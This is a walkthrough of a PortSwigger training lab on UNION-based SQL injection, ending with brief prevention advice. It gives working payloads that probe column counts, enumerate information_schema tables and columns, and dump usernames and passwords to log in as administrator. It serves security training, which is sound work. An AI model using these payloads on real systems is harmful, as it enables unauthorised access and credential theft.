SQL Injection: Listing Database Contents (Non-Oracle Databases)

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

---

Vulnerability

The product category filter is vulnerable to SQL injection.
User input is inserted directly into the SQL query, allowing attackers to perform UNION-based SQL injection and retrieve information from other database tables.

The goal of this lab is to identify the table containing user credentials and retrieve the administrator password.

---

Payloads

Retrieve table names:

' UNION SELECT table_name, NULL FROM information_schema.tables--

Retrieve column names from the users table:

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

Retrieve usernames and passwords:

' UNION SELECT username, password FROM users--

---

Exploitation Steps

1. Navigate to a product category.

2. Determine the number of columns:

' ORDER BY 1--
' ORDER BY 2--

The query returns 2 columns.

3. Retrieve all table names:

' UNION SELECT table_name, NULL FROM information_schema.tables--

Identify the users table.

4. Retrieve column names from the users table:

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

Identify the columns username and password.

5. Retrieve the credentials:

' UNION SELECT username, password FROM users--

6. Log in as:

username: administrator
password: <retrieved password>

This solves the lab.

---

Why the Attack Works

"information_schema" is a system database that stores metadata about tables and columns.

Examples:

information_schema.tables
information_schema.columns

Using UNION injection, attackers can query this metadata to discover:

- table names
- column names
- sensitive data stored in tables.

---

Prevention

- Use parameterized queries
- Avoid constructing SQL queries using raw user input
- Implement strict input validation
